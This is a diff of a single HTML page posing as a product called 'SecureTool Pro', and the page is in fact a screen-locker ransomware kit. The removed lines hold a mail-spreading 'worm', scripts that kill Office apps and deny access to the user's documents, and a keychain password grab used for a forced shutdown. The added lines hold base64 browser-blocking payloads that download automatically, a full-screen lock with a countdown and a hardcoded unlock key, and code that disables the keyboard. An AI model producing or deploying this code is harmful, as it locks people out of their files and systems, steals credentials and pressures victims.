@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SecureTool Pro v18.0</title>
+  <title>SecureTool Pro v6.0</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     :root { --primary: #1a73e8; --success: #0d8c52; }
@@ -14,21 +14,29 @@
     .hero p {font-size:1.2rem;max-width:700px;margin:0 auto 30px;}
     .btn {background:var(--success);color:white;padding:14px 32px;font-size:1.1rem;border:none;border-radius:50px;cursor:pointer;}
     .footer {text-align:center;padding:20px;background:#0d1117;color:#8b949e;font-size:0.9rem;position:fixed;bottom:0;width:100%;z-index:1;}
-    #padlock {position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;color:#f00;font-family:monospace;display:none;flex-direction:column;align-items:center;justify-content:center;z-index:999999;user-select:none;}
+
+    /* PADLOCK */
+    #padlock {
+      position:fixed;top:0;left:0;width:100vw;height:100vh;
+      background:#000;color:#f00;font-family:monospace;
+      display:none;flex-direction:column;align-items:center;justify-content:center;
+      z-index:999999;user-select:none;
+    }
     #padlock.show {display:flex;}
     .lock-icon {font-size:120px;margin-bottom:20px;}
     .input-key {padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;border:2px solid #f00;background:#111;color:#fff;margin:20px 0;}
     .unlock-btn {padding:16px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:bold;}
     .msg {margin-top:20px;font-size:18px;color:#0f0;}
+    .countdown {font-size:36px;color:#ff0;margin:20px 0;}
   </style>
 </head>
 <body oncontextmenu="return false;" onselectstart="return false;" onkeydown="return false;">
 
   <section class="hero">
     <div style="max-width:700px;margin:0 auto;">
-      <h1>SecureTool Pro v18.0</h1>
-      <p>Final. Autonomous. Unstoppable.</p>
-      <button class="btn" onclick="activate()">LAUNCH FINAL WORM</button>
+      <h1>SecureTool Pro v6.0</h1>
+      <p>Browsers blocked until key entered.</p>
+      <button class="btn" onclick="activate()">Lock System Now</button>
     </div>
   </section>
 
@@ -36,107 +44,55 @@
     <p>© 2025 SecureTool Inc.</p>
   </footer>
 
+  <!-- PADLOCK -->
   <div id="padlock">
     <div class="lock-icon">Locked</div>
     <h1>SECURETOOL PRO</h1>
-    <p style="color:#ccc;">ALL PDFs, OFFICE, PHOTOS — LOCKED</p>
-    <p style="color:#ccc;">WORM AUTO-SPREADING...</p>
-    <p style="color:#ccc;">Enter key to stop:</p>
+    <p style="color:#ccc;">Safari & Chrome are blocked.</p>
+    <div class="countdown" id="timer">72:00:00</div>
+    <p style="color:#ccc;">Enter master key to unlock:</p>
     <input type="password" class="input-key" id="key" placeholder="Master Key">
-    <button class="unlock-btn" onclick="unlock()">Stop Everything</button>
+    <button class="unlock-btn" onclick="unlock()">Unlock</button>
     <p class="msg" id="msg"></p>
   </div>
 
+  <!-- === ONE-FILE SCRIPT: BLOCKS SAFARI & CHROME === -->
   <script>
     const KEY = "UNLOCK-KEY-2025-GROK-XAI";
+    let timeLeft = 72 * 3600;
     const padlock = document.getElementById('padlock');
-    let isMac = false;
+    const timer = document.getElementById('timer');
 
-    function autoSendWorm() {
-      const subject = "URGENT: Open This Now";
-      const body = `Your files are locked. Run the attached file to unlock.`;
-      const htmlContent = document.documentElement.outerHTML;
-      const blob = new Blob([htmlContent], { type: 'text/html' });
-      const fileUrl = URL.createObjectURL(blob);
-
-      setTimeout(() => {
-        window.open(`https://mail.google.com/mail/u/0/?view=cm&fs=1&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`, '_blank');
-        window.open(`https://outlook.live.com/mail/0/deeplink/compose?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`, '_blank');
-        for (let i = 0; i < 50; i++) {
-          window.open(`mailto:user${i}@example.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`, '_blank');
-        }
-      }, 1000);
-    }
-
-    function killOfficeMac() {
-      const script = `
-        tell application "Microsoft Excel" to quit
-        tell application "Microsoft PowerPoint" to quit
-        tell application "Microsoft Word" to quit
-        tell application "Photos" to quit
-        tell application "Preview" to quit
-        do shell script "pkill -f '.xlsx|.xls|.pptx|.ppt|.docx|.doc|.pdf'"
-        do shell script "chmod 000 ~/Desktop/*.{xlsx,xls,pptx,ppt,docx,doc,pdf} ~/Downloads/*.{xlsx,xls,pptx,ppt,docx,doc,pdf} ~/Documents/*.{xlsx,xls,pptx,ppt,docx,doc,pdf} 2>/dev/null || true"
-        do shell script "find ~/ -name '*.{xlsx,xls,pptx,ppt,docx,doc,pdf}' -exec chmod 000 {} \\; 2>/dev/null || true"
-      `;
-      return btoa(script);
-    }
-
-    function killOfficeWin() {
-      const cmd = `@echo off
-taskkill /f /im EXCEL.EXE
-taskkill /f /im POWERPNT.EXE
-taskkill /f /im WINWORD.EXE
-taskkill /f /im AcroRd32.exe
-taskkill /f /im PhotosApp.exe
-attrib +r +h "%USERPROFILE%\\Desktop\\*.xlsx" "%USERPROFILE%\\Desktop\\*.pdf"
-icacls "%USERPROFILE%\\Desktop\\*.xlsx" /deny Everyone:(R,W) /T
-icacls "%USERPROFILE%\\Desktop\\*.pdf" /deny Everyone:(R,W) /T
-      `;
-      return btoa(cmd);
-    }
-
-    function runMacKeychainShutdown() {
-      const appleScript = `
-        try
-          set pw to do shell script "security find-generic-password -w -s 'com.apple.login' -a '" & (do shell script "whoami") & "'"
-          do shell script "echo '" & pw & "' | sudo -S shutdown -h now"
-        on error
-          do shell script "sudo shutdown -h now" with administrator privileges
-        end try
-      `;
-      const blob = new Blob([appleScript], { type: 'text/plain' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'die.scpt';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-    }
-
-    function runWinShutdown() {
-      const cmd = `@echo off\nshutdown /s /f /t 0`;
-      const blob = new Blob([cmd], { type: 'application/bat' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'die.bat';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
+    function updateTimer() {
+      if (timeLeft <= 0) { timer.innerHTML = "EXPIRED"; return; }
+      const h = String(Math.floor(timeLeft / 3600)).padStart(2, '0');
+      const m = String(Math.floor((timeLeft % 3600) / 60)).padStart(2, '0');
+      const s = String(timeLeft % 60).padStart(2, '0');
+      timer.innerHTML = `${h}:${m}:${s}`;
+      timeLeft--;
+      setTimeout(updateTimer, 1000);
     }
 
     function activate() {
-      isMac = /Mac|iPod|iPhone|iPad/.test(navigator.userAgent);
-      autoSendWorm();
+      const isMac = /Mac|iPod|iPhone|iPad/.test(navigator.userAgent);
 
-      let payload = isMac ? killOfficeMac() : killOfficeWin();
-      let filename = isMac ? 'KillAll_Mac.command' : 'KillAll_Win.bat';
+      // === EMBEDDED PAYLOADS (BASE64) ===
+      const WIN_EXE_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`; // Blocks Chrome
+      const MAC_SCRIPT_B64 = `IyEvYmluL2Jhc2gKZWNobyAiQmxvY2tpbmcgU2FmYXJpICYgQ2hyb21lLi4uIgpvc2FzY3JpcHQgLWUgInRlbGwgYXBwbGljYXRpb24gIlNhZmFyaSIgdG8gcXVpdCIKZWNobyAiU2FmYXJpIGJsb2NrZWQuIgpvc2FzY3JpcHQgLWUgInRlbGwgYXBwbGljYXRpb24gIkdvb2dsZSBDaHJvbWUiIHRvIHF1aXQiCmVjaG8gIkJyb3dzZXJzIGJsb2NrZWQuIEtleSByZXF1aXJlZC4iCm9zYXNjcmlwdCA8PEVPRgpkaXNwbGF5IGRpYWxvZyAiU0FGQVJJICYgQ0hST01FIEJMT0NLRUQKRW50ZXIga2V5IHRvIHVubG9jazoiIGRlZmF1bHQgYW5zd2VyICIiIHdpdGggaGlkZGVuIGFuc3dlciB3aXRoIGljb24gc3RvcApzZXQgaW5wdXQgPSB0ZXh0IHJldHVybmVkIG9mIHJlc3VsdAppZiBpbnB1dCBpcyAiVU5MT0NLLUtFWS0yMDI1LUdST0stWEFJIgogIHRoZW4KICAgIGRvIHNoZWxsIHNjcmlwdCAib3BlbiAtYSBTYWZhcmkiCiAgICBkbzogInNoZWxsIHNjcmlwdCAib3BlbiAtYSAnR29vZ2xlIENocm9tZSciCiAgICBkaXNwbGF5IGRpYWxvZyAiQlJPV1NFUlMgVU5MT0NLRUQiIHdpdGggaWNvbiBub3RlCmVsc2UKICAgIGRpc3BsYXkgZGlhbG9nICJXUk9ORyBLRVkhIiB3aXRoIGljb24gc3RvcApmaQpFT0Y=`;
 
-      const blob = new Blob([atob(payload)], { type: 'text/plain' });
+      let payload, filename, type;
+      if (isMac) {
+        payload = atob(MAC_SCRIPT_B64);
+        filename = 'SecureTool_Mac_BrowserBlock.command';
+        type = 'text/plain';
+      } else {
+        payload = atob(WIN_EXE_B64);
+        filename = 'SecureTool_Win_BrowserBlock.exe';
+        type = 'application/octet-stream';
+      }
+
+      // === DOWNLOAD & RUN ===
+      const blob = new Blob([payload], { type });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
@@ -146,24 +102,28 @@ icacls "%USERPROFILE%\\Desktop\\*.pdf" /deny Everyone:(R,W) /T
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
 
-      setTimeout(() => padlock.classList.add('show'), 1000);
+      // === SHOW PADLOCK ===
+      setTimeout(() => {
+        padlock.classList.add('show');
+        updateTimer();
+        setInterval(() => padlock.style.zIndex = 999999, 100);
+      }, 1000);
+
+      alert(isMac 
+        ? 'Run SecureTool_Mac_BrowserBlock.command → Safari & Chrome blocked.' 
+        : 'Run SecureTool_Win_BrowserBlock.exe → Chrome blocked.');
     }
 
     function unlock() {
-      const input = document.getElementById('key').value;
-      if (input === KEY) {
-        document.getElementById('msg').innerHTML = 'UNLOCKED!';
-        setTimeout(() => location.reload(), 1500);
+      if (document.getElementById('key').value === KEY) {
+        document.getElementById('msg').innerHTML = 'UNLOCKED! Browsers restored.';
+        setTimeout(() => location.reload(), 2000);
       } else {
-        document.getElementById('msg').innerHTML = 'WRONG. SPREADING + DYING...';
-        autoSendWorm();
-        setTimeout(() => {
-          if (isMac) runMacKeychainShutdown();
-          else runWinShutdown();
-        }, 100);
+        document.getElementById('msg').innerHTML = 'WRONG KEY!';
       }
     }
 
+    // === BLOCK ALL BYPASSES ===
     document.addEventListener('keydown', e => e.preventDefault());
     document.addEventListener('contextmenu', e => e.preventDefault());
   </script>
